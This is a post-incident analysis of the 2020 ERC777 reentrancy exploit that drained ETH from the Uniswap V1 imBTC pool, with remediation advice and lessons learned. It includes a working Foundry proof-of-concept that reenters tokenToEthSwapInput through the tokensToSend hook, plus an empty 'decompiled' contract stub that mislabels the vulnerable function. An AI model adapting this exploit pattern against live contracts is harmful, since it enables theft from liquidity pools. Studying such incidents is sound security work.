# Uniswap V1 — ERC777 Reentrancy Attack Analysis

| Item | Details |
|------|------|
| **Date** | 2020-04-18 |
| **Protocol** | Uniswap V1 |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~$300,000 (imBTC) |
| **Attacker** | [Attack TX Sender](https://etherscan.io/tx/0x32c83905db61047834f29385ff8ce8cb6f3d24f97e24e6101d8301619efee96e) |
| **Attack Tx** | [0x32c83905...](https://etherscan.io/tx/0x32c83905db61047834f29385ff8ce8cb6f3d24f97e24e6101d8301619efee96e) |
| **Vulnerable Contract** | [0xFFcf45b540e6C9F094Ae656D2e34aD11cdfdb187](https://etherscan.io/address/0xFFcf45b540e6C9F094Ae656D2e34aD11cdfdb187) |
| **Root Cause** | Double withdrawal by reentering via ERC777 `tokensToSend` hook before Uniswap V1 pool ETH balance is updated |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2020-04/uniswap-erc777.sol) |

---
## 1. Vulnerability Overview

Uniswap V1 operates by transferring tokens first and then paying out ETH during token-to-ETH swaps. imBTC is a token implementing the ERC777 standard, which invokes the `tokensToSend` hook registered in the sender's ERC1820 registry upon transfer. Because Uniswap V1 did not account for this callback, an attacker was able to reenter via the hook during the token transfer and execute an additional swap before the pool's ETH balance was updated.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Uniswap V1 tokenToEthSwapInput pseudocode (vulnerable)
function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline)
    external returns (uint256)
{
    uint256 eth_bought = getInputPrice(tokens_sold, token.balanceOf(this), address(this).balance);

    // ❌ Token transfer happens first → ERC777 tokensToSend hook is invoked
    // Upon reentry inside the hook, address(this).balance has not yet been decremented
    token.transferFrom(msg.sender, address(this), tokens_sold);

    // ❌ ETH deduction and transfer happen later
    msg.sender.transfer(eth_bought);
    return eth_bought;
}

// ✅ Correct pattern
function tokenToEthSwapInput(...) external nonReentrant returns (uint256) {
    // ✅ Update state first
    // ✅ Then make external calls
}
```

---
### On-Chain Original Code

Source: Bytecode decompilation


**UniswapV1_decompiled.sol** — related contract (vulnerable function facet not included):
```solidity
// ❌ Root cause: Double withdrawal by reentering via ERC777 `tokensToSend` hook before Uniswap V1 pool ETH balance is updated
// ⚠️ Source for vulnerable function `tokensToSend()` is not present in this file
// (Located in a Diamond pattern Facet or proxy implementation)
// SPDX-License-Identifier: UNLICENSED
// Source unverified — reverse-engineered from bytecode
// Original: 0xFFcf45b540e6C9F094Ae656D2e34aD11cdfdb187 (Ethereum Mainnet)
// Reverse engineering method: function selector extraction + 4byte.directory decoding

pragma solidity ^0.8.0;

contract UniswapV1_Decompiled {
}

```

## 3. Attack Flow (ASCII Diagram)

```
Attacker Contract
    │
    ├─[1] Register tokensToSend hook with ERC1820
    │       erc1820.setInterfaceImplementer(this, ERC777TokensSender, this)
    │
    ├─[2] Swap ETH → imBTC (ethToTokenSwapInput)
    │       Uniswap V1 pool: holds imBTC
    │
    ├─[3] Call tokenToEthSwapInput(823084, ...)
    │       └─ Uniswap: executes imBTC.transferFrom
    │           └─ ERC777: invokes tokensToSend hook ────────────────────┐
    │                                                                     │
    ├─[4] Reentry: re-call tokenToEthSwapInput(823084, ...)  ◄───────────┘
    │       └─ Pool ETH balance has not yet been updated
    │           └─ Obtain ETH again at the same price
    │
    └─[5] After reentry completes, original call also completes → total 2x ETH obtained
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface UniswapV1 {
    function ethToTokenSwapInput(uint256 min_token, uint256 deadline) external payable returns (uint256);
    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);
}

interface IERC1820Registry {
    function setInterfaceImplementer(address _addr, bytes32 _interfaceHash, address _implementer) external;
}

interface IERC777 {
    function approve(address spender, uint256 value) external returns (bool);
}

contract ContractTest is Test {
    UniswapV1 uniswapv1 = UniswapV1(0xFFcf45b540e6C9F094Ae656D2e34aD11cdfdb187); // imBTC/ETH pool
    IERC777 imbtc = IERC777(0x3212b29E33587A00FB1C83346f5dBFA69A458923);          // ERC777 imBTC
    uint256 i = 0; // Counter to limit reentry count

    function setUp() public {
        vm.createSelectFork("mainnet", 9_894_153);
    }

    function testExploit() public {
        // [Setup] Register self with ERC1820 as the ERC777 sender hook implementer
        IERC1820Registry _erc1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
        _erc1820.setInterfaceImplementer(address(this), keccak256("ERC777TokensSender"), address(this));

        // [Setup] Purchase imBTC with 1 ETH
        uniswapv1.ethToTokenSwapInput{value: 1 ether}(1, type(uint256).max);

        uint256 beforeBalance = address(this).balance;

        // Approve imBTC spending
        imbtc.approve(address(uniswapv1), 10_000_000);

        // [Attack] tokenToEthSwapInput → ERC777 hook → reentry → additional ETH obtained
        uniswapv1.tokenToEthSwapInput(823_084, 1, type(uint256).max);

        uint256 afterBalance = address(this).balance;
        emit log_named_decimal_uint("My ETH Profit", afterBalance - beforeBalance - 1 ether, 18);
    }

    // ERC777 sender hook: called immediately before imBTC transfer
    function tokensToSend(address, address, address, uint256, bytes calldata, bytes calldata) external {
        if (i < 1) {  // Reenter only once (prevent infinite loop)
            i++;
            // ⚡ Reentry: pool ETH balance not yet updated, so re-swap at the same price
            uniswapv1.tokenToEthSwapInput(823_084, 1, type(uint256).max);
        }
    }

    receive() external payable {}
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Reentrancy Attack |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **Attack Vector** | ERC777 `tokensToSend` callback |
| **Preconditions** | DEX supporting ERC777 tokens, CEI pattern not applied |
| **Impact** | Double withdrawal of ETH from the liquidity pool |
| **Commonality with Lendf.Me** | Same date, same token (imBTC), same mechanism |

---
## 6. Remediation Recommendations

1. **Apply ReentrancyGuard**: Apply the `nonReentrant` modifier to all swap functions.
2. **Follow the CEI Pattern**: Update state variables (balances, etc.) before making external calls.
3. **ERC777 Token Whitelist**: Restrict listing of ERC777 or hook-enabled tokens, or conduct a separate audit.
4. **Uniswap V2 Response**: Uniswap V2 recognized this vulnerability and added reentrancy prevention logic.

---
## 7. Lessons Learned

- **Two protocols hacked on the same day**: Uniswap V1 and Lendf.Me were attacked on the same day using the same token (imBTC) and the same mechanism. This demonstrates the importance of ecosystem-wide vulnerability scanning.
- **ERC777 backward compatibility trap**: ERC777 is interface-compatible with ERC20 but behaves differently, causing unexpected vulnerabilities in protocols that were only tested against ERC20.
- **Importance of audit scope**: The security audit scope must include not only the protocol itself but also the characteristics of external tokens it supports.
- **Difficulty of rapid patching**: Uniswap V1 is a non-upgradeable contract, making post-deployment fixes impossible.